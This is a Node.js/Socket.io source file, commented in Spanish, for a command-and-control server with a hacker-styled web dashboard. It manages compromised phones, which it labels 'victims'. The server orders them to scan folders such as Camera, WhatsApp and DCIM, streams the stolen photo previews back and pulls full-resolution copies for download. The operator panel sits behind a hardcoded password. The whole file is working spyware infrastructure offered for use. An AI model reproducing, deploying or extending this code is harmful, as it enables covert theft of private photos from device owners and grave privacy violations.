const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

// --- CONFIGURACIÓN ---
const AUTH_PASS = "admin123"; 
const PORT = process.env.PORT || 3000;

// --- INTERFAZ WEB V7 (PIXEL ART STYLE) ---
app.get('/', (req, res) => {
    if (req.query.auth !== AUTH_PASS) {
        return res.send(`<body style="background:black;color:red;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;font-size:24px;">⛔ ACCESO DENEGADO</body>`);
    }

    res.send(`
    <html>
        <head>
            <title>C&C V7 ULTIMATE</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
            <style>
                :root { 
                    --bg: #050505; 
                    --panel: #111; 
                    --primary: #00ff41; /* Verde Hacker */
                    --accent: #008F11; 
                    --warn: #ffcc00; 
                    --danger: #ff0033; 
                    --text: #e0e0e0; 
                }
                
                body { 
                    font-family: 'VT323', monospace; 
                    background: var(--bg); 
                    color: var(--text); 
                    margin: 0; padding: 0; 
                    height: 100vh; 
                    overflow: hidden; 
                    font-size: 18px;
                }
                
                /* LAYOUT */
                .container { display: grid; grid-template-columns: 350px 1fr; height: 100%; }
                
                /* SIDEBAR */
                .sidebar { 
                    background: var(--panel); 
                    border-right: 2px solid var(--primary); 
                    padding: 20px; 
                    display: flex; flex-direction: column; gap: 20px; 
                    overflow-y: auto;
                    box-shadow: 5px 0 15px rgba(0, 255, 65, 0.1);
                }
                
                .logo { 
                    color: var(--primary); 
                    font-size: 28px; 
                    border-bottom: 2px dashed var(--primary); 
                    padding-bottom: 15px; 
                    text-align: center;
                    text-shadow: 0 0 5px var(--primary);
                }

                /* CONTROLES */
                .control-group { 
                    background: #000; 
                    padding: 15px; 
                    border: 1px solid #333; 
                    position: relative;
                }
                .control-group::before {
                    content: ''; position: absolute; top: -1px; left: -1px; width: 10px; height: 10px; border-top: 2px solid var(--primary); border-left: 2px solid var(--primary);
                }
                .control-group::after {
                    content: ''; position: absolute; bottom: -1px; right: -1px; width: 10px; height: 10px; border-bottom: 2px solid var(--primary); border-right: 2px solid var(--primary);
                }

                .label { font-size: 20px; color: var(--primary); margin-bottom: 8px; display:block; }
                
                select, input { 
                    width: 100%; padding: 10px; 
                    background: #1a1a1a; 
                    border: 1px solid var(--accent); 
                    color: white; 
                    font-family: 'VT323', monospace; 
                    font-size: 18px; 
                    outline: none;
                    box-sizing: border-box;
                    margin-bottom: 5px;
                }
                select:focus, input:focus { border-color: var(--primary); background: #222; }

                /* BOTONES RETRO */
                button { 
                    width: 100%; padding: 12px; 
                    border: 1px solid var(--primary); 
                    background: #000; 
                    color: var(--primary); 
                    font-family: 'VT323', monospace; 
                    font-size: 20px; 
                    cursor: pointer; 
                    margin-top: 8px; 
                    transition: 0.1s;
                    text-transform: uppercase;
                }
                button:hover { background: var(--primary); color: black; font-weight: bold; box-shadow: 0 0 10px var(--primary); }
                button:active { transform: translateY(2px); }
                
                .btn-stop { border-color: var(--danger); color: var(--danger); }
                .btn-stop:hover { background: var(--danger); color: black; box-shadow: 0 0 10px var(--danger); }

                .btn-freeze { border-color: var(--warn); color: var(--warn); }
                .btn-freeze.active { background: var(--warn); color: black; animation: blink 1s infinite; }
                
                @keyframes blink { 50% { opacity: 0.5; } }

                /* AREA PRINCIPAL */
                .main-area { padding: 20px; overflow-y: auto; background: #080808; position: relative; }
                
                .header-stats { 
                    position: sticky; top: 0; background: rgba(0,0,0,0.9); 
                    padding: 10px; border-bottom: 1px solid var(--primary); 
                    margin: -20px -20px 20px -20px; 
                    z-index: 10; display:flex; justify-content:space-between; 
                    font-size: 22px; color: var(--primary);
                }
                
                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; padding-bottom: 50px; }
                
                /* TARJETAS DE FOTOS */
                .card { 
                    background: #111; border: 1px solid #333; 
                    position: relative; 
                    transition: 0.2s;
                }
                .card:hover { border-color: var(--primary); transform: scale(1.02); z-index: 5; }
                
                .card img { width: 100%; height: 150px; object-fit: cover; cursor: pointer; display: block; filter: grayscale(20%); }
                .card:hover img { filter: grayscale(0%); }
                
                .card-footer { 
                    padding: 5px; font-size: 16px; 
                    background: #000; border-top: 1px solid #333;
                    display: flex; justify-content: space-between; align-items: center;
                }

                .badge { 
                    position: absolute; top: 0; left: 0; 
                    background: black; color: var(--primary); 
                    padding: 2px 6px; font-size: 14px; border-bottom-right-radius: 4px;
                    border-right: 1px solid var(--primary); border-bottom: 1px solid var(--primary);
                }
                
                /* SCROLLBAR RETRO */
                ::-webkit-scrollbar { width: 10px; }
                ::-webkit-scrollbar-track { background: #111; }
                ::-webkit-scrollbar-thumb { background: #333; border: 1px solid var(--primary); }
                ::-webkit-scrollbar-thumb:hover { background: var(--primary); }

            </style>
        </head>
        <body>
            <div class="container">
                <div class="sidebar">
                    <div class="logo">> SYSTEM V7_ROOT</div>

                    <div class="control-group">
                        <span class="label">1. OBJETIVO [TARGET]</span>
                        <select id="victimSelector">
                            <option value="ALL">[*] TODOS LOS DISPOSITIVOS</option>
                        </select>
                        <div id="connectionStatus" style="font-size:16px; color:#555; margin-top:5px;">Offline</div>
                    </div>

                    <div class="control-group">
                        <span class="label">2. FILTRO INTELIGENTE</span>
                        <input type="text" id="smartFolder" placeholder="Ej: Camera, WhatsApp, dcim">
                        <div style="font-size:14px; color:#666; margin-top:2px;">* Dejar vacío para escanear TODO</div>
                    </div>

                    <div class="control-group">
                        <span class="label">3. EJECUTAR</span>
                        <button onclick="sendCommand('start')">[▶] INICIAR ESCANEO</button>
                        <button class="btn-stop" onclick="sendCommand('stop')">[X] DETENER PROCESO</button>
                    </div>

                    <div class="control-group">
                        <span class="label">4. VISUALIZACIÓN</span>
                        <button id="btnFreeze" class="btn-freeze" onclick="toggleFreeze()">[II] CONGELAR PANTALLA</button>
                        <button onclick="clearGrid()">[🗑] LIMPIAR BUFFER</button>
                    </div>
                </div>

                <div class="main-area">
                    <div class="header-stats">
                        <span>ESTADO: <span id="lblStatus" style="color:white;">ESPERANDO COMANDO...</span></span>
                        <span>IMÁGENES: <span id="count" style="color:white;">0</span></span>
                    </div>
                    <div class="grid" id="grid"></div>
                </div>
            </div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                
                // --- VARIABLES DE ESTADO ---
                let victimsMap = {}; 
                let isFrozen = false;
                let pendingBuffer = []; 
                let photoCount = 0;

                // --- 1. GESTIÓN DE DISPOSITIVOS ---
                socket.on('update_device_list', (victims) => {
                    victimsMap = victims;
                    const sel = document.getElementById('victimSelector');
                    const current = sel.value;
                    
                    let html = '<option value="ALL">[*] TODOS (' + Object.keys(victims).length + ')</option>';
                    for (const [id, info] of Object.entries(victims)) {
                        html += \`<option value="\${id}">📱 \${info.name}</option>\`;
                    }
                    sel.innerHTML = html;
                    sel.value = current;

                    const statusDiv = document.getElementById('connectionStatus');
                    statusDiv.innerText = Object.keys(victims).length + " Dispositivos Conectados";
                    statusDiv.style.color = "#00ff41";
                });

                // --- 2. RECEPCIÓN DE FOTOS ---
                socket.on('new_preview', data => {
                    // Si está congelado, guardamos en buffer
                    if (isFrozen) {
                        pendingBuffer.push(data);
                        document.getElementById('btnFreeze').innerText = "[II] PENDIENTES: " + pendingBuffer.length;
                        return;
                    }
                    processImage(data);
                });

                function processImage(data) {
                    // Filtro visual extra (por si acaso)
                    const targetId = document.getElementById('victimSelector').value;
                    if (targetId !== "ALL" && targetId !== data.victimId) return;

                    renderCard(data);
                }

                function renderCard(data) {
                    if(document.getElementById(data.path)) return;

                    const div = document.createElement('div');
                    div.className = 'card';
                    div.id = data.path;
                    
                    const ownerName = victimsMap[data.victimId]?.name || "Unk";
                    
                    div.innerHTML = \`
                        <div class="badge">\${ownerName} | \${data.folder}</div>
                        <img src="data:image/jpeg;base64,\${data.image64}" onclick="pedirHD('\${data.path}', '\${data.victimId}')" title="Clic para descargar HD">
                        <div class="card-footer">
                            <span style="font-size:12px; color:#777;">\${data.name.substring(0,10)}</span>
                            <span style="cursor:pointer; color:var(--primary);" onclick="pedirHD('\${data.path}', '\${data.victimId}')">[HD]</span>
                        </div>
                    \`;

                    document.getElementById('grid').prepend(div);
                    photoCount++;
                    document.getElementById('count').innerText = photoCount;
                }

                // --- 3. FUNCIONES DE CONTROL ---
                function toggleFreeze() {
                    isFrozen = !isFrozen;
                    const btn = document.getElementById('btnFreeze');
                    
                    if (isFrozen) {
                        btn.classList.add('active');
                        btn.innerText = "[II] PANTALLA CONGELADA";
                    } else {
                        btn.classList.remove('active');
                        btn.innerText = "[II] CONGELAR PANTALLA";
                        // Procesar cola
                        pendingBuffer.forEach(data => processImage(data));
                        pendingBuffer = [];
                    }
                }

                function sendCommand(action) {
                    const target = document.getElementById('victimSelector').value;
                    // AQUÍ ESTÁ LA MAGIA DEL V7: Leemos la carpeta y la enviamos
                    const folder = document.getElementById('smartFolder').value.trim();
                    
                    const cmd = action === 'start' ? 'start_scan' : 'stop_scan';
                    
                    document.getElementById('lblStatus').innerText = action === 'start' ? ">> ESCANEANDO: " + (folder || "TODO") : ">> SISTEMA DETENIDO";
                    document.getElementById('lblStatus').style.color = action === 'start' ? "#00ff41" : "red";

                    socket.emit('admin_command', { 
                        action: cmd, 
                        target: target,
                        folder: folder // Enviamos el filtro al celular
                    });
                }

                function pedirHD(path, targetId) {
                    console.log("Solicitando HD...");
                    socket.emit('order_download', { path: path, target: targetId });
                }

                function clearGrid() {
                    document.getElementById('grid').innerHTML = '';
                    photoCount = 0;
                    document.getElementById('count').innerText = '0';
                    pendingBuffer = [];
                }

                // --- 4. DESCARGA HD ---
                socket.on('receive_full', data => {
                    const a = document.createElement('a');
                    a.href = "data:image/jpeg;base64," + data.image64;
                    a.download = "HD_" + data.name;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    
                    const card = document.getElementById(data.path);
                    if(card) card.style.border = "2px solid #00ff41";
                });

            </script>
        </body>
    </html>
    `);
});

const server = http.createServer(app);

// CONFIGURACIÓN ROBUSTA PARA RENDER
const io = new Server(server, { 
    cors: { origin: "*" }, 
    allowEIO3: true,         // Vital para compatibilidad con clientes antiguos/lentos
    maxHttpBufferSize: 1e8   // 100MB para aguantar fotos HD grandes
});

let victims = {};

io.on('connection', (socket) => {
    
    // 1. REGISTRO
    socket.on('usrData', (data) => {
        if (data.dataType === 'register_device') {
            victims[socket.id] = { name: data.deviceName, id: data.deviceId };
            console.log(`[+] DISPOSITIVO: ${data.deviceName} (${socket.id})`);
            io.emit('update_device_list', victims);
        }
        else if (data.dataType === 'preview_image') {
            data.victimId = socket.id;
            socket.broadcast.emit('new_preview', data);
        }
        else if (data.dataType === 'full_image') {
            socket.broadcast.emit('receive_full', data);
        }
    });

    // 2. COMANDOS ADMIN (V7)
    socket.on('admin_command', (cmd) => {
        console.log(`[CMD] ${cmd.action} -> ${cmd.target} (Folder: ${cmd.folder})`);
        
        // Reenviamos el comando CON la carpeta al celular
        if (cmd.target === 'ALL') {
            socket.broadcast.emit('command_' + cmd.action, { folder: cmd.folder });
        } else {
            io.to(cmd.target).emit('command_' + cmd.action, { folder: cmd.folder });
        }
    });

    // 3. SOLICITUD HD
    socket.on('order_download', (data) => {
        if(data.target) {
            io.to(data.target).emit('request_full_image', { path: data.path });
        }
    });

    // 4. DESCONEXIÓN
    socket.on('disconnect', () => {
        if (victims[socket.id]) {
            console.log(`[-] SALIÓ: ${victims[socket.id].name}`);
            delete victims[socket.id];
            io.emit('update_device_list', victims);
        }
    });
});

server.listen(PORT, () => console.log(`🚀 SYSTEM V7 ONLINE :: PORT ${PORT}`));
